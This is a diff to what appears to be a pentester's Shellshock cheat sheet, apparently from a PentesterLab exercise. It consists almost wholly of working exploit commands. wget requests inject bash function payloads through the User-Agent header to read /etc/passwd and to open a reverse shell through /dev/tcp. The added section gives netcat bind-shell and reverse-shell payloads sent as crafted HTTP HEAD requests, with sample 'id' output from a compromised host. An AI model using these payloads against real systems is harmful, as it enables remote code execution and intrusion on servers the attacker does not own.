@@ -41,3 +41,20 @@ Shellshock over proxy:
 wget -q -O- -U "() { test;};echo \"content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd" -e use_proxy=on -e http_proxy=10.0.2.4:3128 "http://127.0.0.1/cgi-bin/status"
 
 wget -q -O- -U "() { test;};echo \"content-type: text/plain\"; echo; echo; /bin/bash -i >& /dev/tcp/10.0.2.15/4444 0>&1" -e use_proxy=on -e http_proxy=10.0.2.4:3128 "http://127.0.0.1/cgi-bin/status"
+
+
+-----------------------------------------------------BIND SHELL-----------------------------------------------------------------
+
+$ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 80
+
+$ nc vulnerable 9999
+id
+uid=1000(pentesterlab) gid=50(staff) groups=50(staff),100(pentesterlab)
+
+
+-----------------------------------------------------REVERSE SHELL-----------------------------------------------------------------
+
+$ nc -l -p 443
+
+$ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc 192.168.159.1 443 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 80
+
